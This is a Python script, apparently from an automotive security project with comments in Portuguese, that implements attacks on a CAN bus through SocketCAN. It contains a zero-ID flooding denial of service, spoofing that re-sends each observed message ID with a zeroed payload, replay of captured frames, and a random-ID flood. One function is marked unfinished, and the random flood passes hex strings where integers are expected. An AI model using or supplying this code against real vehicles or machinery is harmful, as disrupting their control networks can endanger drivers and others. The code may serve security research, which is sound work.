import can
import time 
import subprocess
from random import randint

def zero_dos(): # Negação de serviço, o barramento ficará lotado com zeros, e isso irá sobreescrever qualquer 1, fazendo com que a comunicação fique inviável
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:

        message = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False) # Mensagem CAN para inundar a rede zeros

        # Loop infinito para enviar continuamente mensagens CAN 
        try: 
            while True: 
                bus.send(message) # Envio da mensagem
                time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
        except KeyboardInterrupt:
            pass

        #bus.shutdown() # Limpeza da interface CAN

def message_spoofing_zero_payload():
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:

        while True:
            try:
                for message in bus:
                    #print(message)
                    if message.dlc == 1:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
                    elif message.dlc == 2:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
                    elif message.dlc == 3:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
                    elif message.dlc == 4:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
            except Exception as e:
                print('erro', e)
                
                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                
                bus.flush_tx_buffer()        

# NÃO TERMINADO        
def message_spoofing_min_payload(): # NÃO TERMINADO
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:

        init_time = time.time()

        messages = list()
        while time.time() - init_time <= 60:
            try:
                for message in bus:
                    #print(message)
                    pass
                    


            except Exception as e:
                print('erro', e)
                
                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                
                bus.flush_tx_buffer()

        while True:
            try:
                for message in bus:
                    #print(message)
                    if message.dlc == 1:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
                    elif message.dlc == 2:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
                    elif message.dlc == 3:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
                    elif message.dlc == 4:
                        message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False)
                        bus.send(message)
                        time.sleep(0.01)
            except Exception as e:
                print('erro', e)
                
                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                
                bus.flush_tx_buffer()
    
def replay_messages():
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:
        while True:
            try:
                for message in bus:
                    bus.send(message)
       
            except Exception as e:
                print('erro', e)
                
                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                
                bus.flush_tx_buffer()
       
def random_dos():
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:

        message = can.Message(arbitration_id=hex(randint(1, 2074)), data=[hex(randint(1, 255)), hex(randint(1, 255)), hex(randint(1, 255)), hex(randint(1, 255))], is_extended_id=False) # Mensagem CAN para inundar a rede zeros

        # Loop infinito para enviar continuamente mensagens CAN 
        try: 
            while True: 
                bus.send(message) # Envio da mensagem
                time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
        except KeyboardInterrupt:
            pass